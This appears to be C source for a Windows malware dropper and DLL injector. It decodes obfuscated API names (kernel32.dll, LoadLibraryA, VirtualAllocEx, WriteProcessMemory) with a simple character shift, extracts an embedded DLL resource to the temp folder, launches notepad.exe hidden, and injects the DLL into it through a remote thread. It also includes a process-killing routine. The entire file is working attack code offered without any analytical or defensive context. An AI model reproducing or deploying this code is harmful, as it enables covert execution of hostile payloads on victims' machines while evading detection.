#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "resource.h"
#include "EliRT.h"

typedef HINSTANCE (__stdcall *func_Load)( LPCTSTR );
typedef BOOL (__stdcall *func_VirtualA)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (__stdcall *func_WriteP)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL (__stdcall *func_VirtualF)(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);

HMODULE ASD;
char Func1 [20] = "lfsofm43/emm";
char Func2 [20] = "MpbeMjcsbszB";
char Func3 [20] = "WjsuvbmBmmpdFy";
char Func4 [20] = "XsjufQspdfttNfnpsz";
char Func6 [20] = "BszboTfswfsGXC/emm";

char Final1 [20] = "";
char Final2 [20] = "";
char Final3 [20] = "";
char Final4 [20] = "";

char Process [50] = "notepad.exe";

struct INJDATA
{
	func_Load Load;
	func_VirtualA VirtualA;
	func_WriteP WriteP;
	func_VirtualF VirtualF;
};


int LOL (char * str, char * str2, char * str3, char * str4)
{
int length = 0;
char chr;
int ord;
char end [20] = "";
     while ( length < strlen (str))
     {
                   ord = (int) str [length];
                   ord = ord - 1;
                   chr = (char) ord;
                   end [length] = chr;
				   length++;
     }
strcpy(Final1, end);
strcpy(end, "");
length = 0;
     while ( length < strlen (str2))
     {
                   ord = (int) str2 [length];
                   ord = ord - 1;
                   chr = (char) ord;
                   end [length] = chr;
				   length++;
     }
strcpy(Final2, end);
strcpy(end, "");
length = 0;
     while ( length < strlen (str3))
     {
                   ord = (int) str3 [length];
                   ord = ord - 1;
                   chr = (char) ord;
                   end [length] = chr;
				   length++;
     }
strcpy(Final3, end);
strcpy(end, "");
length = 0;
     while ( length < strlen (str4))
     {
                   ord = (int) str4 [length];
                   ord = ord - 1;
                   chr = (char) ord;
                   end [length] = chr;
				   length++;
     }
strcpy(Final4, end);
strcpy(end, "");
length = 0;
 return 0;
}
BOOL KillProcess(char *Process)
{
	int result;
	HANDLE hProcessSnap = 0;
	HANDLE hProcess = 0;
	HANDLE hSnapshot = 0;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	Process32First(hProcessSnap, &pe32);
	
	while(Process32Next(hProcessSnap, &pe32))
	{
        if(!strcmp(pe32.szExeFile, Process))
        {
			result = 1;
			
			hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
			
			if(TerminateProcess(hProcess, 0) == 0)
			{
				//MessageBox(NULL, "Terminating process failed !", "KillProcess", MB_OK | MB_ICONERROR);
			}
			
			else
			{
				
			}
        }
	}
	
	CloseHandle(hProcess);
	CloseHandle(hProcessSnap);
	
	if(result == 0)
		//MessageBox(NULL, "Process cannot be found !", "KillProcess", MB_OK | MB_ICONWARNING);
		
		result = 0;
	return TRUE;
}      
BOOL BLAH(HANDLE hProcess, LPSTR lpszDllPath, INJDATA * v)
{
	
	if(ASD == NULL || hProcess == NULL)
	{
	MessageBox(NULL, "PROCESS OR KERNAL32 NOT LOADED", "ERROR", MB_OK);
	return FALSE;
	}

	int nPathLen = lstrlen(lpszDllPath) + 1;

	LPVOID lpvMem = (int *)v->VirtualA(hProcess, NULL, nPathLen, MEM_COMMIT, PAGE_READWRITE);
	v->WriteP(hProcess, lpvMem, lpszDllPath, nPathLen, NULL);

	DWORD dwWaitResult, dwExitResult = 0;
	HANDLE hThread = xCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)v->Load, lpvMem, 0, NULL);
	if(hThread != NULL){
		dwWaitResult = WaitForSingleObject(hThread, 10000); // 10 seconds
		GetExitCodeThread(hThread, &dwExitResult);
		CloseHandle(hThread);
	}
	v->VirtualF(hProcess, lpvMem, 0, MEM_RELEASE);
	return ((dwWaitResult != WAIT_TIMEOUT) && (dwExitResult > 0));
}
HANDLE GetProcessHandle(LPSTR szExeName)
{
	PROCESSENTRY32 Pc = { sizeof(PROCESSENTRY32) } ;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if(Process32First(hSnapshot, &Pc)){
		do{
			if(!strcmp(Pc.szExeFile, szExeName)) 
			{
				return OpenProcess(PROCESS_ALL_ACCESS, TRUE, Pc.th32ProcessID);
			}
		}while(Process32Next(hSnapshot, &Pc));
	}

	return NULL;
}

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;
	INJDATA w;
    HANDLE hProcess;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];
	
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\%dres.dll", strTmpPath, GetTickCount());

	//ssageBox(NULL, strBinPath, "strBinPath", MB_OK);
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		MessageBox(NULL, "Failed", "FindResource", MB_OK);
		return FALSE;
	}
	
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		MessageBox(NULL, "Failed", "LoadResource", MB_OK);
		return FALSE;
	}
	hFile = CreateFile
		(strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		MessageBox(NULL, "Failed", "CreateFile", MB_OK);
		return FALSE;
	}
	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	//essageBox(NULL, strBinPath, "Buffer", MB_OK);
	CloseHandle(hFile);
	FreeResource(hRes);
    ShellExecute(NULL, "open",Process, NULL, NULL, SW_HIDE);

	ASD = GetModuleHandle(Final1);
	w.Load = (func_Load)GetProcAddress(ASD, Final2);
	w.VirtualA = (func_VirtualA)GetProcAddress(ASD, Final3);
	w.VirtualF = (func_VirtualF)GetProcAddress(ASD, "VirtualFreeEx");
    w.WriteP = (func_WriteP)GetProcAddress(ASD, Final4);

do{
      hProcess = GetProcessHandle(Process);
      Sleep(1);
  }while(hProcess == NULL);
	
     if(BLAH(hProcess, strBinPath, &w))
	 {
        // MessageBox(HWND_DESKTOP, "An error occurred injecting DLL!", "Error!", MB_OK |MB_ICONERROR);
     }
	
	return TRUE;
}

int main ()
{
	LOL (Func1, Func2, Func3, Func4);
	ReleaseResource(NULL, IDR_EXE, "BINARY");
return 0;
}